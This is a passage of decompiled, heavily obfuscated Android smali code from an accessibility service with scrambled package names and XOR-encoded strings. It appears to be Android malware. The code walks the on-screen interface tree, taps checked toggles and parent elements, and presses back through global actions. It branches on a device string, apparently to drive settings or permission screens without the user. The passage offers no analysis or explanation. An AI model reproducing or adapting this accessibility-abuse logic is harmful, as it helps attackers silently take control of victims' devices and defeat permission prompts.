    if-le v9, v10, :cond_6

    :try_start_1
    invoke-virtual {v0, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v9

    if-eqz v9, :cond_6

    invoke-virtual {v0, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v9

    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v11

    if-le v11, v7, :cond_6

    invoke-virtual {v9, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v11

    invoke-virtual {v11, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v11

    if-eqz v11, :cond_6

    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v12

    if-eqz v12, :cond_6

    invoke-virtual {v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v11

    if-eqz v11, :cond_6

    invoke-static {v9}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto :goto_2

    :catch_1
    move-exception v9

    goto :goto_3

    :cond_6
    :goto_2
    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_4

    :goto_3
    invoke-virtual {v9}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_4
    if-eqz v0, :cond_14

    if-eq v10, v3, :cond_14

    sub-int/2addr v10, v7

    invoke-virtual {v0, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-eqz v3, :cond_14

    invoke-virtual {v0, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    if-lez v3, :cond_7

    sub-int/2addr v3, v7

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    if-lez v3, :cond_7

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->R0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_7
    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a7;->a()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v3, v2, [B

    fill-array-data v3, :array_5

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    const/16 v1, 0x38

    const/16 v3, 0x30

    if-eqz v0, :cond_10

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v3, v3, [B

    fill-array-data v3, :array_6

    new-array v9, v2, [B

    fill-array-data v9, :array_7

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-nez v0, :cond_8

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v1, [B

    fill-array-data v1, :array_8

    new-array v3, v2, [B

    fill-array-data v3, :array_9

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    :cond_8
    sget-boolean v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->r:Z

    const/16 v3, 0x2b

    const/16 v9, 0x23

    if-eqz v1, :cond_c

    if-eqz v0, :cond_12

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-lt v1, v5, :cond_12

    invoke-interface {v0, v7}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-interface {v0, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    sget-boolean v4, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->l:Z

    if-eqz v4, :cond_9

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    return-void

    :cond_9
    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    new-array v0, v9, [B

    fill-array-data v0, :array_a

    new-array v4, v2, [B

    fill-array-data v4, :array_b

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    new-array v3, v3, [B

    fill-array-data v3, :array_c

    new-array v2, v2, [B

    fill-array-data v2, :array_d

    invoke-static {v3, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-eqz v0, :cond_a

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v3

    if-ne v3, v5, :cond_a

    invoke-interface {v0, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_a

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0, v7}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    :cond_a
    if-eqz v2, :cond_13

    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v0

    if-ne v0, v5, :cond_13

    invoke-interface {v2, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_13

    :goto_5
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    :cond_b
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0, v7}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto/16 :goto_6

    :cond_c
    sget-boolean v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->t:Z

    if-eqz v1, :cond_e

    if-eqz v0, :cond_12

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-lt v1, v6, :cond_12

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-interface {v0, v7}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    new-array v0, v9, [B

    fill-array-data v0, :array_e

    new-array v4, v2, [B

    fill-array-data v4, :array_f

    invoke-static {v0, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    new-array v3, v3, [B

    fill-array-data v3, :array_10

    new-array v2, v2, [B

    fill-array-data v2, :array_11

    invoke-static {v3, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-eqz v0, :cond_d

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v3

    if-ne v3, v5, :cond_d

    invoke-interface {v0, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_d

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0, v7}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    :cond_d
    if-eqz v2, :cond_13

    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v0

    if-ne v0, v5, :cond_13

    invoke-interface {v2, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_13

    goto/16 :goto_5

    :cond_e
    if-eqz v0, :cond_12

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-lt v1, v5, :cond_12

    invoke-interface {v0, v7}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-interface {v0, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0x3e8

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    new-array v0, v3, [B

    fill-array-data v0, :array_12

    new-array v3, v2, [B

    fill-array-data v3, :array_13

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    new-array v3, v9, [B

    fill-array-data v3, :array_14

    new-array v2, v2, [B

    fill-array-data v2, :array_15

    invoke-static {v3, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-eqz v0, :cond_f

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v3

    if-ne v3, v5, :cond_f

    invoke-interface {v0, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_f

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    :cond_f
    if-eqz v2, :cond_b

    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v0

    if-ne v0, v5, :cond_b

    invoke-interface {v2, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_b

    goto/16 :goto_5

    :cond_10
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v3, v3, [B

    fill-array-data v3, :array_16

    new-array v5, v2, [B

    fill-array-data v5, :array_17

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-nez v0, :cond_11

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v1, [B

    fill-array-data v1, :array_18

    new-array v2, v2, [B

    fill-array-data v2, :array_19

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    :cond_11
    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_12

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_12

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :goto_6
    invoke-static {v8}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    goto :goto_7

    :cond_12
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    :cond_13
    :goto_7
    const/16 v0, 0xa

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->d3(I)V

    goto :goto_8

    :cond_14
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    :goto_8
    return-void

    :array_0
    .array-data 1
        0x4ct
        -0x7bt
        -0x54t
        -0x38t
        -0x5ct
        0x13t
        0x1bt
        -0x13t
        0x5ct
        -0x3ct
        -0x5dt
        -0x79t
        -0x41t
        0x17t
        0x12t
        -0x16t
        0x56t
        -0x30t
        -0x58t
        -0x7et
        -0x1ct
        0x11t
        0x12t
        -0x5t
        0x56t
        -0x77t
        -0x53t
        -0x7dt
        -0x47t
        0x3ct
        0x1t
        -0xft
        0x4at
        -0x63t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x2ft
        -0x16t
        -0x3ft
        -0x1at
        -0x35t
        0x63t
        0x77t
        -0x68t
    .end array-data

    :array_2
    .array-data 1
        0x41t
        0x1dt
        0x45t
        0x7et
        0x79t
        -0x58t
        -0x61t
        -0x7ct
        0x50t
        0x1dt
        0x5bt
        0x7et
        0x75t
        -0x49t
        -0x7dt
        -0x7ct
        0x45t
        0x7t
        0x49t
        0x22t
        0x7et
        -0x5et
        -0x61t
        -0x73t
        0x18t
        0x1bt
        0x4ct
        0x7ft
        0x68t
        -0x5et
        -0x70t
        -0x6et
        0x41t
        0x1et
        0x4dt
        0x22t
        0x45t
        -0x4ft
        -0x66t
        -0x72t
        0x55t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x22t
        0x72t
        0x28t
        0x50t
        0x1at
        -0x39t
        -0xdt
        -0x15t
    .end array-data

    :array_4
    .array-data 1
        0x4dt
        -0x38t
        -0x40t
        -0x7ft
        -0x5ft
        -0x27t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x3ft
        -0x53t
        -0x5ft
        -0x13t
        -0x34t
        -0x44t
        0x60t
        -0x40t
    .end array-data

    :array_6
    .array-data 1
        -0x2ft
        0xct
        -0x60t
        -0x44t
        0x35t
        -0x73t
        0x5ct
        0x0t
        -0x3ft
        0x4dt
        -0x51t
        -0xdt
        0x2et
        -0x77t
        0x55t
        0x7t
        -0x35t
        0x59t
        -0x5ct
        -0xat
        0x75t
        -0x62t
        0x5ft
        0x0t
        -0x25t
        0x3ct
        -0x43t
        -0x20t
        0x3ft
        -0x65t
        0x55t
        0x7t
        -0x29t
        0xdt
        -0x52t
        -0x9t
        0x5t
        -0x76t
        0x59t
        0x11t
        -0x2bt
        0x6t
        -0x47t
        -0x33t
        0x30t
        -0x78t
        0x5dt
        0x5t
    .end array-data

    :array_7
    .array-data 1
        -0x4et
        0x63t
        -0x33t
        -0x6et
        0x5at
        -0x3t
        0x30t
        0x75t
    .end array-data

    :array_8
    .array-data 1
        0x16t
        -0x5t
        -0x37t
        0x3t
        -0x78t
        0x52t
        -0x2dt
        -0x3et
        0x7t
        -0x5t
        -0x29t
        0x3t
        -0x7ct
        0x4dt
        -0x31t
        -0x3et
        0x12t
        -0x1ft
        -0x3bt
        0x5ft
        -0x71t
        0x58t
        -0x2dt
        -0x35t
        0x4ft
        -0x3t
        -0x40t
        0x2t
        -0x78t
        0x52t
        -0x2dt
        -0x3et
        0x7t
        -0x35t
        -0x2ct
        0x5ft
        -0x72t
        0x5bt
        -0x26t
        -0x21t
        0x10t
        -0x6t
        -0x39t
        0x48t
        -0x4ct
        0x4at
        -0x2at
        -0x37t
        0x12t
        -0xft
        -0x30t
        0x72t
        -0x7ft
        0x48t
        -0x2et
        -0x23t
    .end array-data

    :array_9
    .array-data 1
        0x75t
        -0x6ct
        -0x5ct
        0x2dt
        -0x15t
        0x3dt
        -0x41t
        -0x53t
    .end array-data

    :array_a
    .array-data 1
        0x2ct
        -0x5et
        -0x1et
        0x1ft
        0x17t
        -0x20t
        0x39t
        -0xbt
        0x3ct
        -0x1dt
        -0x13t
        0x50t
        0xct
        -0x1ct
        0x30t
        -0xet
        0x36t
        -0x9t
        -0x1at
        0x55t
        0x57t
        -0xdt
        0x3at
        -0xbt
        0x26t
        -0x6et
        -0x5t
        0x50t
        0x11t
        -0x4t
        0xat
        -0x13t
        0x2et
        -0x41t
        -0x1ct
    .end array-data

    :array_b
    .array-data 1
        0x4ft
        -0x33t
        -0x71t
        0x31t
        0x78t
        -0x70t
        0x55t
        -0x80t
    .end array-data

    :array_c
    .array-data 1
        -0x19t
        -0xat
        -0x5ft
        0x18t
        -0x13t
        0x62t
        0x63t
        -0x2ct
        -0xat
        -0xat
        -0x41t
        0x18t
        -0x1ft
        0x7dt
        0x7ft
        -0x2ct
        -0x1dt
        -0x14t
        -0x53t
        0x44t
        -0x16t
        0x68t
        0x63t
        -0x23t
        -0x42t
        -0x10t
        -0x58t
        0x19t
        -0x13t
        0x62t
        0x63t
        -0x2ct
        -0xat
        -0x3at
        -0x48t
        0x57t
        -0x19t
        0x61t
        0x50t
        -0x2at
        -0x1bt
        -0x15t
        -0x59t
    .end array-data

    :array_d
    .array-data 1
        -0x7ct
        -0x67t
        -0x34t
        0x36t
        -0x72t
        0xdt
        0xft
        -0x45t
    .end array-data

    :array_e
    .array-data 1
        -0x2et
        0x6t
        0x2bt
        0x54t
        0x14t
        -0x54t
        -0x11t
        -0x1bt
        -0x3et
        0x47t
        0x24t
        0x1bt
        0xft
        -0x58t
        -0x1at
        -0x1et
        -0x38t
        0x53t
        0x2ft
        0x1et
        0x54t
        -0x41t
        -0x14t
        -0x1bt
        -0x28t
        0x36t
        0x32t
        0x1bt
        0x12t
        -0x50t
        -0x24t
        -0x3t
        -0x30t
        0x1bt
        0x2dt
    .end array-data

    :array_f
    .array-data 1
        -0x4ft
        0x69t
        0x46t
        0x7at
        0x7bt
        -0x24t
        -0x7dt
        -0x70t
    .end array-data

    :array_10
    .array-data 1
        -0x21t
        0x3dt
        -0x76t
        0x54t
        -0x54t
        0x21t
        0x53t
        -0x49t
        -0x32t
        0x3dt
        -0x6ct
        0x54t
        -0x60t
        0x3et
        0x4ft
        -0x49t
        -0x25t
        0x27t
        -0x7at
        0x8t
        -0x55t
        0x2bt
        0x53t
        -0x42t
